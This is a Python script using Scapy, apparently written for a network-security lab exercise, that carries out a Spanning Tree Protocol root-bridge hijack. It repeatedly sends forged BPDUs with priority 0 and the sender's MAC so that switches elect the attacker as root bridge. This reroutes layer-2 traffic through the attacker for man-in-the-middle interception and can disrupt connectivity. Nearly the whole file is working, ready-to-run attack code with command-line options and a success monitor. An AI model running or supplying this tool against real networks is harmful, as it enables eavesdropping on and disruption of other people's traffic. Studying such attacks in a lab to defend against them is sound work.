#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║              ATAQUE STP ROOT CLAIM (Root Bridge Hijacking)      ║
║              Seguridad de Redes — Laboratorio #6                ║
╚══════════════════════════════════════════════════════════════════╝

Descripción:
    Manipula el protocolo STP (Spanning Tree Protocol) enviando
    BPDUs (Bridge Protocol Data Units) con prioridad 0 y Bridge-ID
    mínimo para que el atacante sea elegido Root Bridge.
    
    Consecuencias:
    - Todo el tráfico de la red pasa por el atacante
    - Cambios en la topología STP (recálculo de árbol)
    - Posible pérdida de conectividad durante la convergencia
    - MitM pasivo sobre todo el tráfico de capa 2

Flujo del ataque:
    1. Se envían BPDUs con prioridad 0 (mínima posible en STP)
    2. El switch compara el Bridge-ID recibido con el Root actual
    3. Si el Bridge-ID del atacante es menor, lo elige como Root
    4. Se recalcula el árbol de spanning tree
    5. Tráfico enrutado a través del atacante

Requisitos:
    pip install scapy
    Ejecutar como root

Uso:
    sudo python3 stp_root.py -i eth0
    sudo python3 stp_root.py -i eth0 --priority 0 --vlan 1 -c 100
"""

import argparse
import os
import random
import sys
import time
from threading import Thread, Event

try:
    from scapy.all import (
        Ether, LLC, STP, sendp, conf, get_if_hwaddr, sniff
    )
except ImportError:
    print("[!] Instalar Scapy: pip install scapy")
    sys.exit(1)


# ─── Constantes STP ───────────────────────────────────────────────────────────
STP_MULTICAST    = "01:80:c2:00:00:00"  # Dirección multicast STP
STP_DSAP         = 0x42
STP_SSAP         = 0x42
STP_CTRL         = 0x03


def get_local_mac(iface: str) -> str:
    """Obtiene la MAC de la interfaz o genera una aleatoria."""
    try:
        mac = get_if_hwaddr(iface)
        return mac
    except Exception:
        return ':'.join(f'{random.randint(0,255):02x}' for _ in range(6))


def mac_to_int(mac: str) -> int:
    """Convierte MAC a entero para comparación de Bridge-ID."""
    return int(mac.replace(':', ''), 16)


def build_stp_bpdu(
    iface:       str,
    root_mac:    str,
    bridge_mac:  str,
    priority:    int,
    port_id:     int,
    vlan:        int,
    path_cost:   int,
    hello_time:  float,
    max_age:     float,
    fwd_delay:   float
) -> bytes:
    """
    Construye un BPDU STP (Configuration BPDU — tipo 0x00).
    
    El Bridge-ID se compone de: [priority (4 bits) | vlan (12 bits) | MAC (6 bytes)]
    Para ganar la elección se necesita el Bridge-ID MÁS BAJO.
    
    Args:
        priority:   Prioridad STP (0-61440, múltiplo de 4096)
        path_cost:  Coste del camino al Root (0 = somos el Root)
        port_id:    ID del puerto del atacante
    """
    # En STP, el Root Bridge-ID y el Sender Bridge-ID son iguales
    # cuando el atacante reclama ser el Root
    root_priority   = priority
    bridge_priority = priority

    pkt = (
        Ether(src=bridge_mac, dst=STP_MULTICAST) /
        LLC(dsap=STP_DSAP, ssap=STP_SSAP, ctrl=STP_CTRL) /
        STP(
            proto=0,                     # Protocolo STP (0x0000)
            version=0,                   # STP clásico (802.1D)
            bpdutype=0x00,               # Configuration BPDU
            bpduflags=0x01,              # TC flag (Topology Change)
            rootid=root_priority,        # Root Bridge priority
            rootmac=root_mac,            # Root Bridge MAC (nosotros)
            pathcost=path_cost,          # Coste = 0 (somos el Root)
            bridgeid=bridge_priority,    # Sender Bridge priority
            bridgemac=bridge_mac,        # Sender MAC (nosotros)
            portid=port_id,              # Puerto de envío
            age=0,                       # Message Age
            maxage=int(max_age * 256),   # Max Age
            hellotime=int(hello_time * 256),
            fwddelay=int(fwd_delay * 256)
        )
    )
    return pkt


def monitor_stp(iface: str, stop_event: Event) -> None:
    """
    Escucha BPDUs entrantes para detectar si hay otro Root Bridge
    compitiendo o si el ataque fue exitoso.
    """
    own_mac = get_local_mac(iface).lower()

    def handler(pkt):
        if stop_event.is_set():
            return
        if pkt.haslayer(STP):
            stp = pkt[STP]
            root_mac = stp.rootmac
            if root_mac.lower() == own_mac:
                print(f"\n[✓] ÉXITO: Somos el Root Bridge (MAC: {root_mac})")
            else:
                print(f"\n[~] BPDU detectado — Root actual: {root_mac} "
                      f"(prioridad: {stp.rootid})")

    sniff(
        iface=iface,
        filter="ether dst 01:80:c2:00:00:00",
        prn=handler,
        store=False,
        stop_filter=lambda _: stop_event.is_set()
    )


def stats_printer(counter: list, stop_event: Event) -> None:
    start = time.time()
    while not stop_event.is_set():
        elapsed = time.time() - start
        print(f"\r[*] BPDUs enviados: {counter[0]:,} | "
              f"Tiempo: {elapsed:.0f}s | "
              f"Presiona Ctrl+C para detener", end='', flush=True)
        time.sleep(1)


def run_attack(
    iface:      str,
    priority:   int,
    count:      int,
    hello_time: float,
    max_age:    float,
    fwd_delay:  float,
    vlan:       int,
    path_cost:  int,
    monitor:    bool,
    verbose:    bool
) -> None:
    """Ejecuta el ataque STP Root Claim."""
    conf.verb  = 0
    attacker_mac = get_local_mac(iface)
    counter      = [0]
    stop_event   = Event()

    # El atacante se autoprocla Root: root_mac = bridge_mac = attacker_mac
    root_mac   = attacker_mac
    bridge_mac = attacker_mac
    port_id    = 0x8001  # Puerto 1

    print(f"""
╔══════════════════════════════════════════╗
║      STP Root Claim — Iniciando          ║
╠══════════════════════════════════════════╣
║  Interfaz   : {iface:<26} ║
║  Atacante   : {attacker_mac:<26} ║
║  Prioridad  : {priority:<26} ║
║  VLAN       : {vlan:<26} ║
║  Path Cost  : {path_cost:<26} ║
║  Hello Time : {hello_time}s{'':<23} ║
║  BPDUs      : {'∞' if count == 0 else str(count):<26} ║
╚══════════════════════════════════════════╝
[*] Enviando BPDUs con Bridge-ID: {priority}/{attacker_mac}
[!] Para ganar: nuestro Bridge-ID debe ser < que el Root actual
[!] Presiona Ctrl+C para detener
""")

    threads = [
        Thread(target=stats_printer,
               args=(counter, stop_event), daemon=True)
    ]

    if monitor:
        threads.append(Thread(
            target=monitor_stp,
            args=(iface, stop_event), daemon=True
        ))

    for t in threads:
        t.start()

    try:
        sent = 0
        while count == 0 or sent < count:
            pkt = build_stp_bpdu(
                iface=iface,
                root_mac=root_mac,
                bridge_mac=bridge_mac,
                priority=priority,
                port_id=port_id,
                vlan=vlan,
                path_cost=path_cost,
                hello_time=hello_time,
                max_age=max_age,
                fwd_delay=fwd_delay
            )

            sendp(pkt, iface=iface, verbose=0)
            counter[0] += 1
            sent += 1

            if verbose:
                print(f"\n[>] BPDU #{sent}: Root={root_mac} "
                      f"Prio={priority} PathCost={path_cost}")

            time.sleep(hello_time)

    except KeyboardInterrupt:
        print("\n\n[*] Ataque detenido.")
    finally:
        stop_event.set()
        time.sleep(0.5)
        print(f"\n[+] Total BPDUs enviados: {counter[0]:,}")
        print(f"[+] Bridge-ID usado: {priority}/{attacker_mac}")
        print("\n[*] Nota: El switch puede tardar hasta Max_Age segundos en")
        print("    reconocer el nuevo Root Bridge.")


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Ataque STP Root Claim — reclama ser el Root Bridge"
    )
    parser.add_argument('-i', '--iface',    required=True, help='Interfaz de red')
    parser.add_argument('--priority',       type=int, default=0,
                        help='Prioridad STP (0-61440, múltiplo 4096; default: 0)')
    parser.add_argument('-c', '--count',    type=int, default=0,
                        help='BPDUs a enviar (0=infinito, default: 0)')
    parser.add_argument('--hello-time',     type=float, default=2.0,
                        help='Hello time en segundos (default: 2.0)')
    parser.add_argument('--max-age',        type=float, default=20.0,
                        help='Max age en segundos (default: 20.0)')
    parser.add_argument('--fwd-delay',      type=float, default=15.0,
                        help='Forward delay en segundos (default: 15.0)')
    parser.add_argument('--vlan',           type=int, default=1,
                        help='VLAN ID (default: 1)')
    parser.add_argument('--path-cost',      type=int, default=0,
                        help='Path cost al Root (0=somos el Root, default: 0)')
    parser.add_argument('--monitor',        action='store_true',
                        help='Monitorear BPDUs entrantes para verificar éxito')
    parser.add_argument('-v', '--verbose',  action='store_true',
                        help='Mostrar cada BPDU enviado')
    return parser.parse_args()


if __name__ == '__main__':
    if os.geteuid() != 0:
        print("[!] Ejecutar como root")
        sys.exit(1)

    args = parse_args()

    # Validar prioridad
    if args.priority % 4096 != 0:
        print(f"[!] La prioridad debe ser múltiplo de 4096 (0, 4096, 8192...)")
        sys.exit(1)

    run_attack(
        iface      = args.iface,
        priority   = args.priority,
        count      = args.count,
        hello_time = args.hello_time,
        max_age    = args.max_age,
        fwd_delay  = args.fwd_delay,
        vlan       = args.vlan,
        path_cost  = args.path_cost,
        monitor    = args.monitor,
        verbose    = args.verbose
    )
